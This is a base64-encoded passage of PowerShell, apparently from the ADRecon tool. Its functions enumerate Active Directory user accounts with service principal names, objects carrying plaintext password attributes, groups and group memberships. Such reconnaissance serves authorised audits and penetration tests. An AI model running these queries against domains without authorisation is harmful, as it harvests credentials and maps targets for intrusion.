QJykKICAgIHsKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKHNlcnZpY2VQcmluY2lwYWxOYW1lPSopKSIKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoIm5hbWUiLCJkZXNjcmlwdGlvbiIsIm1lbWJlcm9mIiwic2FtYWNjb3VudG5hbWUiLCJzZXJ2aWNlcHJpbmNpcGFsbmFtZSIsInByaW1hcnlncm91cGlkIiwicHdkbGFzdHNldCIsInVzZXJhY2NvdW50Y29udHJvbCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEVXNlcnMgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlVzZXJTUE5dIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFVzZXJTUE4gT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAkT2JqU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgIElmICgkQURVc2VycykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBVc2VyU1BOczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURVc2VycykpIgogICAgICAgICAgICAkVXNlclNQTk9iaiA9IFtBRFJlY29uLkxEQVBDbGFzc106OlVzZXJTUE5QYXJzZXIoJEFEVXNlcnMsICRUaHJlYWRzKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURVc2VycwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFVzZXJTUE5PYmopCiAgICB7CiAgICAgICAgUmV0dXJuICRVc2VyU1BOT2JqCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9Cgp9CgojVE9ETwpGdW5jdGlvbiBHZXQtQURSUGFzc3dvcmRBdHRyaWJ1dGVzCnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIGFsbCBvYmplY3RzIHdpdGggcGxhaW50ZXh0IHBhc3N3b3JkcyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIG9iamVjdHMgd2l0aCBwbGFpbnRleHQgcGFzc3dvcmRzIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIFBhZ2VTaXplCiAgICBbaW50XQogICAgVGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LiBEZWZhdWx0IDIwMC4KCi5PVVRQVVRTCiAgICBQU09iamVjdC4KCi5MSU5LCiAgICBodHRwczovL3d3dy5pYm0uY29tL3N1cHBvcnQva25vd2xlZGdlY2VudGVyL2VuL3Nzd19haXhfNzEvY29tLmlibS5haXguc2VjdXJpdHkvYWRfcGFzc3dvcmRfYXR0cmlidXRlX3NlbGVjdGlvbi5odG0KICAgIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvY2MyMjMyNDguYXNweAogICAgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9jYzIyMzI0OS5hc3B4CiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICRQYWdlU2l6ZQogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFVzZXJzID0gR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICcofChVc2VyUGFzc3dvcmQ9KikoVW5peFVzZXJQYXNzd29yZD0qKSh1bmljb2RlUHdkPSopKG1zU0ZVMzBQYXNzd29yZD0qKSknIC1SZXN1bHRQYWdlU2l6ZSAkUGFnZVNpemUgLVByb3BlcnRpZXMgKgogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJQYXNzd29yZEF0dHJpYnV0ZXNdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFBhc3N3b3JkIEF0dHJpYnV0ZXMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURVc2VycykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlsqXSBUb3RhbCBQYXNzd29yZEF0dHJpYnV0ZSBPYmplY3RzOiAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBRFVzZXJzKSkiCiAgICAgICAgICAgICRVc2VyT2JqID0gJEFEVXNlcnMKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFEVXNlcnMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgICRvYmpTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRvYmpEb21haW4KICAgICAgICAkT2JqU2VhcmNoZXIuUGFnZVNpemUgPSAkUGFnZVNpemUKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIih8KFVzZXJQYXNzd29yZD0qKShVbml4VXNlclBhc3N3b3JkPSopKHVuaWNvZGVQd2Q9KikobXNTRlUzMFBhc3N3b3JkPSopKSIKICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFVzZXJzID0gJE9ialNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJQYXNzd29yZEF0dHJpYnV0ZXNdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIFBhc3N3b3JkIEF0dHJpYnV0ZXMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFEVXNlcnMpCiAgICAgICAgewogICAgICAgICAgICAkY250ID0gW0FEUmVjb24uTERBUENsYXNzXTo6T2JqZWN0Q291bnQoJEFEVXNlcnMpCiAgICAgICAgICAgIElmICgkY250IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbKl0gVG90YWwgUGFzc3dvcmRBdHRyaWJ1dGUgT2JqZWN0czogJGNudCIKICAgICAgICAgICAgfQogICAgICAgICAgICAkVXNlck9iaiA9ICRBRFVzZXJzCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFVzZXJzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkVXNlck9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJFVzZXJPYmoKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUkdyb3VwCnsKPCMKLlNZTk9QU0lTCiAgICBSZXR1cm5zIGFsbCBncm91cHMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGFsbCBncm91cHMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbaW50XSAkUGFnZVNpemUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkVGhyZWFkcyA9IDEwCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFER3JvdXBzID0gQCggR2V0LUFER3JvdXAgLUZpbHRlciAqIC1SZXN1bHRQYWdlU2l6ZSAkUGFnZVNpemUgLVByb3BlcnRpZXMgQWRtaW5Db3VudCxDYW5vbmljYWxOYW1lLERpc3Rpbmd1aXNoZWROYW1lLERlc2NyaXB0aW9uLEdyb3VwQ2F0ZWdvcnksR3JvdXBTY29wZSxTYW1BY2NvdW50TmFtZSxTSUQsU0lESGlzdG9yeSxtYW5hZ2VkQnksd2hlbkNoYW5nZWQsd2hlbkNyZWF0ZWQgKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHcm91cF0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgR3JvdXAgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCRBREdyb3VwcykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBHcm91cHM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFER3JvdXBzKSkiCiAgICAgICAgICAgICRHcm91cE9iaiA9IFtBRFJlY29uLkFEV1NDbGFzc106Okdyb3VwUGFyc2VyKCRBREdyb3VwcywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREdyb3VwcwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKG9iamVjdENsYXNzPWdyb3VwKSIKICAgICAgICAkT2JqU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoImFkbWluY291bnQiLCJjYW5vbmljYWxuYW1lIiwgImRpc3Rpbmd1aXNoZWRuYW1lIiwgImRlc2NyaXB0aW9uIiwgImdyb3VwdHlwZSIsInNhbWFjY291bnRuYW1lIiwgInNpZGhpc3RvcnkiLCAibWFuYWdlZGJ5IiwgIm9iamVjdHNpZCIsICJ3aGVuY3JlYXRlZCIsICJ3aGVuY2hhbmdlZCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBREdyb3VwcyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSR3JvdXBdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIEdyb3VwIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFER3JvdXBzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIEdyb3VwczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURHcm91cHMpKSIKICAgICAgICAgICAgJEdyb3VwT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6R3JvdXBQYXJzZXIoJEFER3JvdXBzLCAkVGhyZWFkcykKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFER3JvdXBzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkR3JvdXBPYmopCiAgICB7CiAgICAgICAgUmV0dXJuICRHcm91cE9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURSR3JvdXBNZW1iZXIKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIGdyb3VwcyBhbmQgdGhlaXIgbWVtYmVycyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIGdyb3VwcyBhbmQgdGhlaXIgbWVtYmVycyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBvYmpEb21haW4KICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0KICAgIERvbWFpbiBEaXJlY3RvcnkgRW50cnkgb2JqZWN0LgoKLlBBUkFNRVRFUiBQYWdlU2l6ZQogICAgW2ludF0KICAgIFRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4gRGVmYXVsdCAyMDAuCgouUEFSQU1FVEVSIFRocmVhZHMKICAgIFtpbnRdCiAgICBUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGR1cmluZyBwcm9jZXNzaW5nIG9mIG9iamVjdHMuIERlZmF1bHQgMTAuCgouT1VUUFVUUwogICAgUFNPYmplY3QuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICRQYWdlU2l6ZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtpbnRdICRUaHJlYWRzID0gMTAKICAgICkKCiAgICBJZiAoJFByb3RvY29sIC1lcSAnQURXUycpCiAgICB7CiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQUREb21haW4gPSBHZXQtQUREb21haW4KICAgICAgICAgICAgJEFERG9tYWluU0lEID0gJEFERG9tYWluLkRvbWFpblNJRC5WYWx1ZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQUREb21haW4KICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSR3JvdXBNZW1iZXJdIEVycm9yIGdldHRpbmcgRG9tYWluIENvbnRleHQiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFER3JvdXBzID0gJEFER3JvdXBzID0gQCggR2V0LUFER3JvdXAgLUZpbHRlciAqIC1SZXN1bHRQYWdlU2l6ZSAkUGFnZVNpemUgLVByb3BlcnRpZXMgU2FtQWNjb3VudE5hbWUsU0lEICkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSR3JvdXBNZW1iZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIEdyb3VwIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgIH0KCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURHcm91cE1lbWJlcnMgPSBAKCBHZXQtQURPYmplY3QgLUxEQVBGaWx0ZXIgJyh8KG1lbWJlcm9mPSopKHByaW1hcnlncm91cGlkPSopKScgLVByb3BlcnRpZXMgRGlzdGluZ3Vpc2hlZE5hbWUsbWVtYmVyb2YscHJpbWFyeUdyb3VwSUQsc0FNQWNjb3VudE5hbWUsc2FtYWNjb3VudHR5cGUgKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHcm91cE1lbWJlcl0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgR3JvdXBNZW1iZXIgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgSWYgKCAoJEFERG9tYWluU0lEKSAtYW5kICgkQURHcm91cHMpIC1hbmQgKCRBREdyb3VwTWVtYmVycykgKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIEdyb3VwTWVtYmVyIE9iamVjdHM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFER3JvdXBNZW1iZXJzKSkiCiAgICAgICAgICAgICRHcm91cE1lbWJlck9iaiA9IFtBRFJlY29uLkFEV1NDbGFzc106Okdyb3VwTWVtYmVyUGFyc2VyKCRBREdyb3VwcywgJEFER3JvdXBNZW1iZXJzLCAkQUREb21haW5TSUQsICRUaHJlYWRzKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURHcm91cHMKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFER3JvdXBNZW1iZXJzCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRERvbWFpblNJRAogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CgogICAgICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICB7CiAgICAgICAgICAgICREb21haW5GUUROID0gR2V0LUROdG9GUUROKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpCiAgICAgICAgICAgICREb21haW5Db250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoIkRvbWFpbiIsJCgkRG9tYWluRlFETiksJCgkQ3JlZGVudGlhbC5Vc2VyTmFtZSksJCgkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLnBhc3N3b3JkKSkKICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRBRERvbWFpbiA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkdyb3VwTWVtYmVyXSBFcnJvciBnZXR0aW5nIERvbWFpbiBDb250ZXh0IgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgRG9tYWluQ29udGV4dAogICAgICAgICAgICBUcnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEZvcmVzdENvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgiRm9yZXN0IiwkKCRBRERvbWFpbi5Gb3Jlc3QpLCQoJENyZWRlbnRpYWwuVXNlck5hbWUpLCQoJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5wYXNzd29yZCkpCiAgICAgICAgICAgICAgICAkQURGb3Jlc3QgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3RdOjpHZXRGb3Jlc3QoJEZvcmVzdENvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJHcm91cE1lbWJlcl0gRXJyb3IgZ2V0dGluZyBGb3Jlc3QgQ29udGV4dCIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIElmICgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEZvcmVzdENvbnRleHQKICAgICAgICAgICAgfQogICAgICAgICAgICBJZiAoJEFERm9yZXN0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkR2xvYmFsQ2F0YWxvZyA9ICRBREZvcmVzdC5GaW5kR2xvYmFsQ2F0YWxvZygpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgSWYgKCRHbG9iYWxDYXRhbG9nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkRE4gPSAiR0M6Ly8kKCRHbG9iYWxDYXRhbG9nLklQQWRkcmVzcykvJCgkb2JqRG9tYWluLmRpc3Rpbmd1aXNoZWRuYW1lKSIKICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRBRE9iamVjdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAtQXJndW1lbnRMaXN0ICgkKCRETiksJCgkQ3JlZGVudGlhbC5Vc2VyTmFtZSksJCgkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLnBhc3N3b3JkKSkKICAgICAgICAgICAgICAgICAgICAkQUREb21haW5TSUQgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRBRE9iamVjdC5vYmplY3RTaWRbMF0sIDApCiAgICAgICAgICAgICAgICAgICAgJEFET2JqZWN0LkRpc3Bvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkdyb3VwTWVtYmVyXSBFcnJvciByZXRyaWV2aW5nIERvbWFpbiBTSUQgdXNpbmcgdGhlIEdsb2JhbENhdGFsb2cgJCgkR2xvYmFsQ2F0YWxvZy5JUEFkZHJlc3MpLiBVc2luZyBTSUQgZnJvbSB0aGUgT2JqRG9tYWluLiIKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICAkQUREb21haW5TSUQgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRvYmpEb21haW4ub2JqZWN0U2lkWzBdLCAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEFERG9tYWluU0lEID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkb2JqRG9tYWluLm9iamVjdFNpZFswXSwgMCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBFbHNlCiAgICAgICAgewogICAgICAgICAgICAkQUREb21haW4gPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dOjpHZXRDdXJyZW50RG9tYWluKCkKICAgICAgICAgICAgJEFERm9yZXN0ID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRm9yZXN0XTo6R2V0Q3VycmVudEZvcmVzdCgpCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkR2xvYmFsQ2F0YWxvZyA9ICRBREZvcmVzdC5GaW5kR2xvYmFsQ2F0YWxvZygpCiAgICAgICAgICAgICAgICAkRE4gPSAiR0M6Ly8kKCRHbG9iYWxDYXRhbG9nKS8kKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgJEFET2JqZWN0ID0gTm